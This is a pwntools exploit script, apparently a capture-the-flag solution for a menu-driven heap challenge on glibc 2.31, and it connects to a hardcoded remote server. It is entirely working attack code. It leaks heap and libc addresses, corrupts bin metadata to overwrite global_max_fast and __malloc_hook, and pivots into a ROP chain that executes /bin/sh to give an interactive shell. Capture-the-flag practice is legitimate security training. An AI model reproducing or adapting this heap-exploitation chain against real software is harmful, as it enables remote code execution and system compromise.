from pwn import *

###Util
def create(size,data):
    r.sendlineafter('Choice >','1')
    r.sendlineafter('size : ',str(size))
    r.sendafter('Content : ',data)

def show(idx):
    r.sendlineafter('Choice >','2')
    r.sendlineafter('index : ',str(idx))
    return r.recvline()[:-1]

def edit(idx,data=None):
    r.sendlineafter('Choice >','3')
    r.sendlineafter('index : ',str(idx))
    r.sendafter('Content : ',data)

def delete(idx):
    r.sendlineafter('Choice >','4')
    r.sendlineafter('index : ',str(idx))

###Addr
#  libc2.31
main_arena_offset = 0x1ebb80
unsorted_bin_offset = main_arena_offset+0x60
global_maxfast_offset = 0x1eeb80
malloc_hook_offset = 0x1ebb70
realloc_offset = 0x9e000
system_offset = 0x55410
bin_sh_offset = 0x1b75aa

###ROPgadget
L_pop_rdi = 0x26b72
L_pop_rsi = 0x27529
L_pop_rdx_rbx = 0x162866
L_pop_rax = 0x4a550
L_syscall = 0x66229
L_leave = 0x5aa48

###Exploit
r = remote('140.112.31.97',30204)

create(0x100,'M30W')    #0
for i in range(8):
    create(0xf0,'M30W')	#1~8
for i in range(2,9):
    delete(i)
heap_addr = u64(show(3).ljust(8,b'\x00'))-0x10
print(hex(heap_addr))

delete(1)
unsorted_bin_addr = u64(show(1)+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

create(0xf0,'M30W')     #9
edit(0,p64(0x101)+p64(heap_addr+0x2b0)+p64(heap_addr+0x2b0)+p64(heap_addr+0x2a0)+p64(heap_addr+0x2a0)+b'\x00'*0xd0+p64(0x100))
delete(9)

edit(0,p64(0xf1)+p64(libc_base+unsorted_bin_offset)+p64(libc_base+unsorted_bin_offset)+b'\x00'*0xd0+p64(0xf0)+p64(0x20))
create(0x100,'M30W')    #10

edit(0,p64(0xf1)+\
       p64(libc_base+unsorted_bin_offset)+p64(heap_addr+0x2b0)+\
       p64(heap_addr+0x2a0)+p64(heap_addr+0x2c0)+\
       p64(0)+p64(heap_addr+0x2d0)+\
       p64(0)+p64(heap_addr+0x2e0)+\
       p64(0)+p64(heap_addr+0x2f0)+\
       p64(0)+p64(heap_addr+0x300)+\
       p64(0)+p64(heap_addr+0x310)+\
       p64(0)+p64(libc_base+global_maxfast_offset-0x10)+\
       b'\x00'*0x60+\
       p64(0xf0)+p64(0x20)+\
       p64(0x100)[:-1])
create(0xe0,'M30W')     #11
delete(11)

edit(0,p64(0x101)) 
delete(11)

edit(0,p64(0xf1)+p64(libc_base+malloc_hook_offset-0x161))

create(0xe0,'M30W')     #12
create(0xe0,b'\x00'*0xd1+p64(0x101))    #13

edit(0,p64(0x101)+p64(libc_base+malloc_hook_offset-0x80))

ROPchain = p64(libc_base+L_pop_rdi)+p64(libc_base+bin_sh_offset)+\
           p64(libc_base+L_pop_rsi)+p64(0)+\
           p64(libc_base+L_pop_rdx_rbx)+p64(0)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(0x3b)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(0x3c)+\
           p64(libc_base+L_syscall)
create(0xf0,ROPchain)     #14
create(0xf0,b'\x00'*0x60+p64(libc_base+L_leave)+p64(libc_base+realloc_offset+20))     #15

r.sendlineafter('Choice >','1')
r.sendlineafter('size : ',str(0x80).encode().ljust(0x10,b'\x00')+p64(heap_addr+0x2b0))

r.interactive()
